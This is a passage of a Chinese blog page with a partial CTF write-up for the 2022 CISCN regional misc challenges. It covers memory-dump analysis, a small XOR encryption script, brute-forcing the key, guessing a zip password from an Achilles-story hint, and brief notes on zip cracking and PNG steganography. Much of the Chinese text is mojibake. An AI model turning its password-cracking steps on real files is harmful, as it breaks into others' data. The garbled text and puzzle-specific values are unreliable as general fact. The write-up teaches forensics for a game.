According to Homer&#39;s epic, the hero Achilles is the precious son of the mortal Polus and the beautiful fairy Thetis.
It is said that her mother Tethys carried him upside down into the Styx river when he was just born, so that he could be invulnerable.
Unfortunately, due to the rapid flow of the Ming River, his mother didn&#39;t dare to let go of his heel.
The heel held by his mother was accidentally exposed outside the water, so the heel was the most vulnerable place, leaving the only &quot;dead hole&quot; in his body, so he buried the disaster.
When he grew up, Achilles fought bravely. When he went to attack the city of Troy (the story of Trojan horse slaughtering the city), the brave Achilles singled out the Trojan general Hector, killed him and dragged his body to demonstrate.
But later, after conquering Troy, Achilles was attacked by an arrow by Hector&#39;s brother-in-law Paris and hit his ankle - the hero fell to the ground and died at the moment of shaking.
ankle, ankle, I love ankle.The password is ??k1eAn???

Process: 2060
Text:
?

Text:
d

Text:


Text:
?

Text:
???????????????????????????????XOR?EOR????????????????????????????????letter?????????????????????????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>å¾—åˆ°æœ‰æ•ˆçš„ä¿¡æ¯</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">f &#x3D; open(&#39;.&#x2F;flag.zip&#39;, &#39;rb&#39;).read()
new &#x3D; open(&#39;.&#x2F;fffflllaag.dat&#39;, &#39;ab&#39;)

letter &#x3D; &#39;&#39;
secret &#x3D; int(letter,16)
print(secret) k1eAn 
for i in f:
    n &#x3D; int(i) ^ secret
    new.write(int(n).to_bytes(1, &#39;big&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>å’Œpasswd ??K1eAn??? è¿™é‡Œæœ‰äº”ä¸ªæ•°å­—ä¸çŸ¥é“ã€‚</p>
<p>ç„¶åç”¨å·¥å…·æœäº†ä¸€ä¸‹flagæ–‡ä»¶ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œdumpå‡ºå£é‡Œé¢å­˜äº†</p>
<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c976b15ac7a25d56c78d58c224c7d05dae18551f.png" srcset="/img/loading.gif" lazyload alt="å›¾ç‰‡.png"></p>
<p>è¿™ä¸ªå°±æ˜¯åŠ å¯†ä¹‹åçš„ä¸œè¥¿ï¼Œéœ€è¦æˆ‘ä»¬æ‰¾åˆ°letterè¿˜åŸå‡ºflag.zipï¼Œå•Šè¿™é‡Œæƒ³åˆ°ä¹‹å‰æœ‰ä¸ªå›¾ç‰‡ï¼Œç„¶åæœå›¾ç‰‡ï¼Œï¼Œç„¶ådumpå‡ºæ¥ï¼Œæ‹¿åˆ°å›¾ç‰‡</p>
<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-368bed714433476487e5dc2dbf15b93fdb704dab.png" srcset="/img/loading.gif" lazyload alt="å›¾ç‰‡.png"><br>
ä»¥ä¸ºæ˜¯pngéšå†™ï¼Œåæ­£letterè‚¯å®šåœ¨è¿™é‡Œï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰è§£å‡ºæ¥ï¼Œï¼ˆé—®äº†åˆ«çš„å¸ˆå‚…ï¼Œå¥½åƒæ˜¯å•¥æ©¡æ ‘ç½®æ¢ï¼Œåæ­£æˆ‘ä¹Ÿåªæ˜¯ä¸šä½™çš„miscé€‰æ‰‹ã€‚ä¸å¤ªæ‡‚ï¼‰ï¼Œäºæ˜¯æˆ‘æƒ³åˆ°äº†dataåŠ å¯†çš„æ—¶å€™ï¼Œæ˜¯ä¸€ä¸ªä¸€ä¸ªå­—èŠ‚å†™çš„ï¼Œäºæ˜¯æˆ‘ç›´æ¥çˆ†ç ´äº†127ä¸ªå¯è§å­—ç¬¦ä¸²ï¼Œåœ¨ç¬¬åä¸ªæ‹¿åˆ°äº†flag.zip</p>
<p>flag.zipè¿˜æ‰“ä¸å¼€ï¼Œè¦å¯†ç ï¼Œè¿™æ—¶å€™æˆ‘åˆæƒ³åˆ°äº†passwdã€‚æœ¬æ¥æ˜¯æ©ç çˆ†ç ´çš„ï¼Œåæ¥çœ‹æ—¶é—´å¤ªé•¿äº†ã€‚æˆ‘ä¸€çœ‹å“‡ï¼Œä¸å°±æ˜¯ankleå†™ä¸¤éå—<br>
Ank1eAnk1eï¼Œç„¶åå°±å‡ºäº†ï¼Œé‡Œé¢æ˜¯ä¸ªtxt</p>
<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-62e333920aa772e310205dba52eb64aa2866d5e3.png" srcset="/img/loading.gif" lazyload alt="å›¾ç‰‡.png"></p>
<p>ç„¶åå°±å¼€å§‹äº†å¯¹è„‘ç”µæ³¢çš„è¿‡ç¨‹ï¼Œï¼Œï¼Œ<br>
çŸ¥é“æˆ‘æ‰«äº†ä¸€écmdlineã€‚ã€‚ã€‚å‘ç°äº†æœ‰ä¸ªegg1.rtf<br>
dumpå‡ºæ¥ä¹‹å</p>
<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-704658b7d06eccd1b2725af87e264f90940dda4d.png" srcset="/img/loading.gif" lazyload alt="å›¾ç‰‡.png"><br>
ç„¶åå°±å‡ºäº†<br>
flag=md5{You are the only weakness in my body}</p>
<h3 id="misc2-zipcracker2"><a class="header-anchor" href="#misc2-zipcracker2">Â¶</a>misc2 zipcracker2</h3>
<p>ä¸å†™äº†ä¼ªåŠ å¯†å’Œæ˜æ–‡æ”»å‡»ä¸€æŠŠæ¢­</p>
<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-31375225c063062174436f57425c2564cd152f88.png" srcset="/img/loading.gif" lazyload alt="å›¾ç‰‡.png"></p>
<h3 id="misc3-pngcracker"><a class="header-anchor" href="#misc3-pngcracker">Â¶</a>misc3 pngcracker</h3>
<p>è¿™ä¸ªä¹Ÿç®€å•ï¼Œbinwalkå‘ç°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæ‹‰é•¿pngå¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼Œç„¶åå‹ç¼©åŒ…é‡Œé¢çš„misc.pngæœ‰lsbéšå†™ï¼Œç›´æ¥å°±å‡ºäº†</p>
<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-673596b978977bcfcb09ef245cb23de55cbe72ce.png" srcset="/img/loading.gif" lazyload alt="å›¾ç‰‡.png"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/ciscn/">#ciscn</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CISCNåä¸­èµ›åŒºåˆ†åŒºèµ›-éƒ¨åˆ†wp</div>
      <div>http://example.com/2022/06/29/CISCNåä¸­èµ›åŒºåˆ†åŒºèµ›-éƒ¨åˆ†wp/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Epiphany</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2022å¹´6æœˆ29æ—¥</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>è®¸å¯åè®®</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/06/30/Arch-linux%E8%AE%B0%E5%BD%95/" title="Arch-linuxè®°å½•">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Arch-linuxè®°å½•</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/06/29/CVE-2021-0277%E4%BB%8E%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E5%88%B0poc%E7%BC%96%E5%86%99/" title="junosçš„ä¸€äº›æŒ–æ˜">
                        <span class="hidden-mobile">junosçš„ä¸€äº›æŒ–æ˜</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"QC4vvYPEM2BYGMlNkxfbdllW-gzGzoHsz","appKey":"nsnNub648pvsc3yts6pFQY1A","path":"window.location.pathname","placeholder":"ç•™è¨€å­","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://qc4vvype.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="website-duration">è½½å…¥ç½‘ç«™è¿è¡Œæ—¶é—´...</span> <script src="/js/duration.js"></script> </div>   
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="leancloud-site-pv"></span>
         æ¬¡
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        æ€»è®¿å®¢æ•° 
        <span id="leancloud-site-uv"></span>
         äºº
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script  src="https://lib.baomitu.com/prism/1.27.0/plugins/line-numbers/prism-line-numbers.min.js" ></script>

  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="/js/leancloud.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
